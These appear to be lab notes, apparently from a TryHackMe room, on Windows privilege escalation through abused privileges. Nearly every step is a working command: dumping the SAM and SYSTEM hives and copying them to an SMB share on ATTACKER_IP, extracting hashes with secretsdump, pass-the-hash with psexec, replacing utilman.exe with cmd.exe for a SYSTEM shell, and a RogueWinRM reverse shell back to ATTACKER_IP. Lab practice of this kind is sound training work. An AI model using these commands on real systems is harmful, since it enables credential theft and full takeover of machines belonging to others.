Each user has a set of assigned privileges that can be checked with the following command:

```
whoami /priv
```

**SeBackup / SeRestore:**
The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place.

Backup the SAM and SYSTEM hashes with:

```
reg save hklm\system C:\Users\THMBackup\system.hive

reg save hklm\sam C:\Users\THMBackup\sam.hive
```

Setup Directory to Send Files to Attacking Maching:

```
mkdir share

python3.9 /opt/impacket/examples/smbserver.py -smb2support -username user -password pass public share
```

Copy Backups Over:

```
copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\

copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```

And use impacket to retrieve the users' password hashes:

```
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
```

Use the Administrator's hash to perform a Pass-the-Hash attack:

```
python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 user@ip
```

**SeTakeOwnership:**
The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys.

To replace utilman, we will start by taking ownership of it with the following command:

```
takeown /f C:\Windows\System32\Utilman.exe
```

Give your user full permissions over utilman.exe with:

```
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
```

Replace utilman.exe with a copy of cmd.exe:
```
copy cmd.exe utilman.exe
```

To trigger utilman, lock our screen from the start button, and finally, proceed to click on the "Ease of Access" button, which runs utilman.exe with SYSTEM privileges.


**SeImpersonate / SeAssignPrimaryToken:**
These privileges allow a process to impersonate other users and act on their behalf.

Assuming we have already compromised a website running on IIS and that we have planted a web shell on the following address:

`http://10.10.90.78/`

Spawn a listner on your machine with:

```
nc -nlvp port
```

Install RougeWinRM on target system and run it with:

```
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP port"
```



